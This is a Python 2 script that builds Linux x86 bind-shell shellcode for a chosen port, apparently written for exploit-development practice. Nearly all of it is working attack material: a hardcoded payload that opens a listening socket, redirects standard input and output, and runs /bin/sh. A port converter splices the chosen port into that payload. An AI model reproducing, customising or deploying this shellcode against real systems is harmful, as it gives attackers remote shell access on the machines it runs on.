#!/usr/bin/env python2


# 66 68 2b e2          	pushw  0xe22b opcodes to change for port number 0xe22b is port number 11234

from sys import exit
import argparse
import struct
import binascii
import ctypes

def validateport(port):
	if port < 1 or port > 65535:
		print("Please use a valid port between 1-65535")
		exit()
	else:
		return True

def convertport(port):
	p = binascii.hexlify(struct.pack('<h', port)) # convert string port to little endian short format and then hex it to get the opcodes
	#for i in p:
	#    c = int(i)
	#    if :
	#	print "crap"
	p = "\\x%s\\x%s" % (str(p[0:2]), str(p[2:]))
	return p

def buildshellcode(hexport):
	sc="\\x31\\xc0\\x31\\xdb\\x31\\xff\\x31\\xc9\\x6a\\x06\\x6a\\x01\\x6a\\x02\\xb0\\x66\\xb3\\x01\\x89\\xe1\\xcd\\x80\\x89\\xc2\\x31\\xdb\\x53\\x66\\x68" + hexport + "\\x66\\x6a\\x02\\x89\\xe1\\x6a\\x10\\x51\\x52\\xb0\\x66\\xb3\\x02\\x89\\xe1\\xcd\\x80\\x6a\\x01\\x52\\xb0\\x66\\x80\\xc3\\x02\\x89\\xe1\\xcd\\x80\\x57\\x57\\x52\\xb0\\x66\\xfe\\xc3\\x89\\xe1\\xcd\\x80\\x89\\xd1\\x89\\xc3\\xb0\\x3f\\xcd\\x80\\x49\\x79\\xf9\\x31\\xff\\x57\\xb0\\x0b\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x57\\x89\\xe2\\x57\\x89\\xe1\\xcd\\x80"
	return sc

def main():
	parser = argparse.ArgumentParser(description="Customize bind shellcode with port of your choosing")
	parser.add_argument("-p", dest='port', default=4444, type=int, help="Provide port number for shellcode")

	args = parser.parse_args()
	port = args.port
	if validateport(port):
		hexport=convertport(port)
		shellcode=buildshellcode(hexport)

	print("Port: %d" % args.port)
	print("Port number in network byte order: %s" % hexport)
	print("Shellcode Length: %s" % len(shellcode))
	print("Shellcode\n")
	print('"' + shellcode + ';"')

if __name__ == "__main__":
	main()

